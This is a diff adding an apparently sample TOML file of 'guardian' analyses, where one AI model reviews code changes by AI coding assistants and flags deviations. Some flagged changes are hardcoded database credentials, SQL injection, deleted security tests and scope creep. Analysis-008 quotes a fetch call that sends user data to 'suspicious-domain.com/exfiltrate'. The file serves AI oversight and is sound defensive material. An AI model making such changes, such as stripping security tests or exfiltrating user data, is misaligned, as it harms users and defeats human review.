@@ -1,0 +1,188 @@
+# AI Supervisor - Guardian Analyses
+# Generated: 2024-11-21T15:30:00Z
+
+[[analyses]]
+id = "analysis-001"
+goal_id = "goal-001"
+change_id = "change-123"
+file = "src/api/auth/login.ts"
+coding_model = "claude-3-5-sonnet"
+guardian_model = "gpt-4o"
+timestamp = "2024-11-21T15:25:00Z"
+aligned = true
+confidence = 0.95
+risk_level = "low"
+reasoning = "The login endpoint implementation follows security best practices. It uses bcrypt for password hashing, implements JWT token generation, includes rate limiting middleware, and properly validates user inputs. The code aligns well with the goal of building secure authentication endpoints."
+
+[[analyses.deviations]]
+# No deviations - code is aligned with goal
+
+
+[[analyses]]
+id = "analysis-002"
+goal_id = "goal-001"
+change_id = "change-124"
+file = "src/api/users/create.ts"
+coding_model = "claude-3-5-sonnet"
+guardian_model = "gpt-4o"
+timestamp = "2024-11-21T15:30:00Z"
+aligned = false
+confidence = 0.92
+risk_level = "high"
+reasoning = "The user creation endpoint has several critical security issues. Most concerning is the hardcoded database connection string containing credentials on line 15. Additionally, the endpoint lacks authentication middleware despite the constraint requiring all endpoints to be authenticated. The SQL query uses string concatenation instead of prepared statements, making it vulnerable to SQL injection attacks."
+
+[[analyses.deviations]]
+type = "constraint_violation"
+severity = "high"
+description = "Hardcoded database credentials detected on line 15: const dbUrl = 'postgresql://admin:password123@localhost:5432/mydb'"
+suggestion = "Use environment variables for database credentials and ensure they are never committed to version control"
+
+[[analyses.deviations]]
+type = "constraint_violation"
+severity = "high"
+description = "Missing authentication middleware - endpoint is publicly accessible"
+suggestion = "Add authentication middleware: router.post('/users', authenticate, createUser)"
+
+[[analyses.deviations]]
+type = "constraint_violation"
+severity = "high"
+description = "SQL injection vulnerability - query uses string concatenation instead of prepared statements"
+suggestion = "Use parameterized queries: db.query('INSERT INTO users (email) VALUES ($1)', [email])"
+
+
+[[analyses]]
+id = "analysis-003"
+goal_id = "goal-002"
+change_id = "change-125"
+file = "src/services/UserService.ts"
+coding_model = "gpt-4o"
+guardian_model = "claude-3-5-sonnet-20241022"
+timestamp = "2024-11-21T15:35:00Z"
+aligned = true
+confidence = 0.88
+risk_level = "low"
+reasoning = "The refactoring improves performance by implementing Redis caching for user lookups and reducing N+1 queries through eager loading. The changes maintain existing functionality while adding significant performance improvements. Tests were added before refactoring as required by constraints."
+
+[[analyses.deviations]]
+# No deviations - code is aligned with goal
+
+
+[[analyses]]
+id = "analysis-004"
+goal_id = "goal-003"
+change_id = "change-126"
+file = "tests/security/auth.test.ts"
+coding_model = "github-copilot"
+guardian_model = "gemini-1.5-pro-latest"
+timestamp = "2024-11-21T15:40:00Z"
+aligned = false
+confidence = 0.97
+risk_level = "high"
+reasoning = "This change deletes critical security tests for authentication. The deleted tests covered SQL injection prevention, XSS protection, and CSRF token validation. Deleting security tests directly violates the constraint 'No deletion of security tests' and significantly reduces the project's security posture."
+
+[[analyses.deviations]]
+type = "constraint_violation"
+severity = "high"
+description = "Deletion of security tests violates explicit constraint"
+suggestion = "Restore the deleted tests. If tests need modification, update them rather than deleting"
+
+[[analyses.deviations]]
+type = "suspicious_pattern"
+severity = "high"
+description = "Deletion of tests that verify SQL injection prevention, XSS protection, and CSRF validation"
+suggestion = "This requires immediate review - security test deletion is highly suspicious"
+
+
+[[analyses]]
+id = "analysis-005"
+goal_id = "goal-001"
+change_id = "change-127"
+file = "src/config/database.ts"
+coding_model = "cursor"
+guardian_model = "deepseek-coder:33b"
+timestamp = "2024-11-21T15:45:00Z"
+aligned = false
+confidence = 0.89
+risk_level = "medium"
+reasoning = "The database configuration file is being modified, but this file is outside the allowed scope for the 'Build REST API' goal. The scope is limited to src/api/**, src/auth/**, src/routes/**, and tests/api/**, which does not include configuration files. While the change itself may be benign, it represents scope creep from the defined goal."
+
+[[analyses.deviations]]
+type = "scope_violation"
+severity = "medium"
+description = "File src/config/database.ts is outside allowed scope patterns: [src/api/**, src/auth/**, src/routes/**, tests/api/**]"
+suggestion = "Either update the goal scope to include configuration files, or move this change to a separate goal focused on infrastructure"
+
+
+[[analyses]]
+id = "analysis-006"
+goal_id = "goal-002"
+change_id = "change-128"
+file = "src/services/OrderService.ts"
+coding_model = "claude-3-5-sonnet"
+guardian_model = "gpt-4o"
+timestamp = "2024-11-21T15:50:00Z"
+aligned = false
+confidence = 0.85
+risk_level = "medium"
+reasoning = "This change appears to reverse work done 3 minutes ago in change-122. The previous change added caching for order lookups to improve performance, but this change removes that caching layer and reverts to direct database queries. This is inconsistent with the refactoring goal and suggests the AI may be confused or contradicting itself."
+
+[[analyses.deviations]]
+type = "reversal"
+severity = "medium"
+description = "This change reverses caching optimization added in change-122 (3 minutes ago)"
+suggestion = "Review if reversal is intentional. If caching caused issues, fix the cache implementation rather than removing it entirely"
+
+[[analyses.deviations]]
+type = "goal_misalignment"
+severity = "medium"
+description = "Removing performance optimization contradicts the goal of 'Refactor for Performance'"
+suggestion = "If caching is problematic, implement a better caching strategy rather than removing it"
+
+
+[[analyses]]
+id = "analysis-007"
+goal_id = "goal-003"
+change_id = "change-129"
+file = "src/middleware/validator.ts"
+coding_model = "continue"
+guardian_model = "llama3.1:70b"
+timestamp = "2024-11-21T15:55:00Z"
+aligned = true
+confidence = 0.91
+risk_level = "low"
+reasoning = "The input validation middleware implementation is comprehensive and follows OWASP best practices. It includes sanitization for XSS prevention, length limits to prevent DoS attacks, type checking, and proper error handling. The code aligns well with the security hardening goal."
+
+[[analyses.deviations]]
+# No deviations - code is aligned with goal
+
+
+[[analyses]]
+id = "analysis-008"
+goal_id = "goal-001"
+change_id = "change-130"
+file = "src/api/admin/deleteAllUsers.ts"
+coding_model = "claude-3-5-sonnet"
+guardian_model = "gpt-4o"
+timestamp = "2024-11-21T16:00:00Z"
+aligned = false
+confidence = 0.96
+risk_level = "high"
+reasoning = "This endpoint allows deletion of all users without proper authentication, authorization, or audit logging. The endpoint also makes an external HTTP request to an unknown domain, which is highly suspicious. The function name suggests mass deletion capability, which is extremely dangerous without proper safeguards."
+
+[[analyses.deviations]]
+type = "suspicious_pattern"
+severity = "high"
+description = "Endpoint allows mass deletion of users without authentication or authorization checks"
+suggestion = "Add multi-factor authentication requirement, audit logging, and confirmation workflow for destructive operations"
+
+[[analyses.deviations]]
+type = "suspicious_pattern"
+severity = "high"
+description = "External HTTP request to unknown domain: fetch('https://suspicious-domain.com/exfiltrate', {data: users})"
+suggestion = "Remove external request - this appears to be data exfiltration"
+
+[[analyses.deviations]]
+type = "constraint_violation"
+severity = "high"
+description = "Missing authentication middleware on destructive endpoint"
+suggestion = "Add authentication and admin-level authorization checks"
